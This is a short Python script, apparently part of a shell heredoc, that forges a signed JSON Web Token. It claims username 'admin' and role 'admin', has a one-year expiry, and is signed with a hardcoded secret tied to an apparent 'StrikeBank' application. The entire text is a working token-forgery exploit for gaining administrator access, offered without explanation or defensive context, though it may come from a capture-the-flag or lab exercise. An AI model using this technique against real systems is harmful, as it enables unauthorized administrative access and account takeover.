import base64, hashlib, hmac, json, time

secret = 'Str!k3B4nkSup3rs3cr37'

def b64u(data):
    if isinstance(data, str): data = data.encode()
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

now = int(time.time())
h = b64u(json.dumps({'alg':'HS256','typ':'JWT'}, separators=(',',':')))
p = b64u(json.dumps({'username':'admin','role':'admin','exp':now+86400*365,'iat':now}, separators=(',',':')))
sig = hmac.new(secret.encode(), f'{h}.{p}'.encode(), hashlib.sha256).digest()
print(f'{h}.{p}.{b64u(sig)}')
EOF
